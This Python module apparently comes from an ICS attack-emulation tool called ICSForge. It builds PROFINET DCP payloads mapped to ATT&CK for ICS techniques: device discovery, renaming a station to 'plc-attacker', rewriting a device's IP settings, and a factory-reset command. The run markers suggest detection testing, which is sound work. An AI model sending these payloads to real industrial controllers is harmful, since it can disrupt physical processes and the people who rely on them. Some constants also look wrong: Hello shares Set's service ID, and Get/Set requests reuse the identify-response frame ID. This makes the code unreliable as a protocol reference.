# ICSForge PROFINET DCP payload builder — upgraded for ATT&CK realism
# PROFINET Discovery and Configuration Protocol (DCP) over Ethernet
import random, struct

from .common import ether_frame
from icsforge.core import MARKER


# DCP Service IDs
SVC_ID = {
    "identify": 0x05,
    "hello":    0x04,
    "get":      0x03,
    "set":      0x04,  # Note: same ID as hello, differentiated by type
}

# DCP Service Types
SVC_TYPE = {
    "request":         0x00,
    "response_success":0x01,
    "response_error":  0x05,
}

# DCP Option/SubOption codes
OPTION = {
    "ip":     (1, 2),   # IP address parameter
    "name":   (2, 2),   # NameOfStation
    "device": (2, 3),   # DeviceType
    "alias":  (2, 4),   # Alias
    "rpc":    (4, 1),   # RPC service
    "ctrl":   (5, 1),   # Start/Stop
    "all":    (0xFF, 0xFF),  # All options (identify)
}

# PROFINET frame IDs
FRAME_ID = {
    "dcp_identify_multicast": 0xFEFE,  # DCP identify request (multicast)
    "dcp_identify_unicast":   0xFEFF,  # DCP identify response
    "dcp_hello":              0xFEFD,  # DCP Hello
    "ptcp_sync":              0xFF00,  # PTCP time sync (precision)
}


def _dcp_pdu(frame_id: int, service_id: int, service_type: int,
             xid: int, dcp_data: bytes) -> bytes:
    """Build DCP PDU: FrameID(2) + SvcID(1) + SvcType(1) + XID(4) + ResponseDelay(2) + DataLen(2) + Data."""
    response_delay = 0x0000
    return struct.pack(">HBBIHH",
        frame_id, service_id, service_type, xid,
        response_delay, len(dcp_data)
    ) + dcp_data


def _dcp_block(option: int, suboption: int, data: bytes) -> bytes:
    """DCP block: Option(1) + SubOption(1) + BlockLen(2) + Data + optional padding."""
    block_info = bytes([option, suboption]) + struct.pack(">H", len(data)) + data
    if len(data) % 2:
        block_info += b"\x00"  # pad to even
    return block_info


def build(src_mac: str | None = None, dst_mac: str | None = None):
    """Legacy interface: build basic DCP identify request."""
    src_mac = src_mac or "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    dst_mac = dst_mac or "01:0e:cf:00:00:00"
    xid     = random.randint(0, 0xFFFFFFFF)
    dcp     = _dcp_pdu(FRAME_ID["dcp_identify_multicast"], SVC_ID["identify"],
                       SVC_TYPE["request"], xid, b"")
    payload = dcp + MARKER
    return ether_frame(src_mac, dst_mac, 0x8892, payload)


def build_payload(run_marker: bytes, style: str = "identify", **kwargs) -> bytes:
    """
    Build PROFINET DCP payload (without Ethernet wrapper).

    Styles:
      identify           Identify All (multicast) — T0840/T0888 Discovery
      identify_unicast   Identify to specific device — T0888
      get_name           DCP Get NameOfStation — T0882/T0840
      get_ip             DCP Get IP — T0882/T0840
      set_name           DCP Set NameOfStation — T0849 Masquerading
      set_ip             DCP Set IP parameter — T0849 Masquerading
      hello              DCP Hello PDU — T0840 device announcement
      factory_reset      DCP Set Control (factory reset) — T0816
    """
    rnd = random.random
    xid = random.randint(0, 0xFFFFFFFF)
    # Accept both bytes (from build_marker) and str (from marker_bytes/tests)
    if isinstance(run_marker, str):
        from .common import marker_bytes
        mb = marker_bytes(run_marker)
    else:
        mb = run_marker

    if style == "identify":
        # Identify request with All suboption — T0840/T0888
        block   = _dcp_block(0xFF, 0xFF, b"")  # option ALL
        payload = _dcp_pdu(FRAME_ID["dcp_identify_multicast"],
                           SVC_ID["identify"], SVC_TYPE["request"], xid, block)

    elif style == "identify_unicast":
        # Identify request unicast (targeting specific device) — T0888
        block   = _dcp_block(0xFF, 0xFF, b"")
        payload = _dcp_pdu(FRAME_ID["dcp_identify_unicast"],
                           SVC_ID["identify"], SVC_TYPE["request"], xid, block)

    elif style == "get_name":
        # DCP Get NameOfStation — T0882 Theft of Operational Info
        block   = _dcp_block(OPTION["name"][0], OPTION["name"][1], b"")
        payload = _dcp_pdu(FRAME_ID["dcp_identify_unicast"],
                           SVC_ID["get"], SVC_TYPE["request"], xid, block)

    elif style == "get_ip":
        # DCP Get IP address — T0882
        block   = _dcp_block(OPTION["ip"][0], OPTION["ip"][1], b"")
        payload = _dcp_pdu(FRAME_ID["dcp_identify_unicast"],
                           SVC_ID["get"], SVC_TYPE["request"], xid, block)

    elif style == "set_name":
        # DCP Set NameOfStation — T0849 Masquerading (rename device)
        name    = kwargs.get("station_name", b"plc-attacker")
        if isinstance(name, str):
            name = name.encode()
        block_data = bytes([0x00, 0x01]) + name  # BlockQualifier(2) + name
        block   = _dcp_block(OPTION["name"][0], OPTION["name"][1], block_data)
        payload = _dcp_pdu(FRAME_ID["dcp_identify_unicast"],
                           SVC_ID["set"], SVC_TYPE["request"], xid, block)

    elif style == "set_ip":
        # DCP Set IP — T0849 Masquerading (change device IP)
        ip      = kwargs.get("ip", b"\x0a\x00\x00\x64")   # 10.0.0.100
        mask    = kwargs.get("mask", b"\xff\xff\xff\x00")
        gw      = kwargs.get("gw",   b"\x0a\x00\x00\x01")
        block_data = bytes([0x00, 0x01]) + ip + mask + gw  # qualifier + IP + Mask + GW
        block   = _dcp_block(OPTION["ip"][0], OPTION["ip"][1], block_data)
        payload = _dcp_pdu(FRAME_ID["dcp_identify_unicast"],
                           SVC_ID["set"], SVC_TYPE["request"], xid, block)

    elif style == "hello":
        # DCP Hello — device announces itself — T0840 passive enumeration
        name    = kwargs.get("station_name", b"plc-hello")
        if isinstance(name, str):
            name = name.encode()
        block_data = bytes([0x00, 0x01]) + name
        block   = _dcp_block(OPTION["name"][0], OPTION["name"][1], block_data)
        payload = _dcp_pdu(FRAME_ID["dcp_hello"],
                           SVC_ID["hello"], SVC_TYPE["request"], xid, block)

    elif style == "factory_reset":
        # DCP Set Control = Factory Reset — T0816 Device Restart
        block_data = bytes([0x00, 0x02, 0x00, 0x04])  # BlockQualifier: Remanent=Yes, Action=4 (FactoryReset)
        block   = _dcp_block(OPTION["ctrl"][0], OPTION["ctrl"][1], block_data)
        payload = _dcp_pdu(FRAME_ID["dcp_identify_unicast"],
                           SVC_ID["set"], SVC_TYPE["request"], xid, block)

    else:
        # Fallback: identify
        block   = _dcp_block(0xFF, 0xFF, b"")
        payload = _dcp_pdu(FRAME_ID["dcp_identify_multicast"],
                           SVC_ID["identify"], SVC_TYPE["request"], xid, block)

    return payload + mb
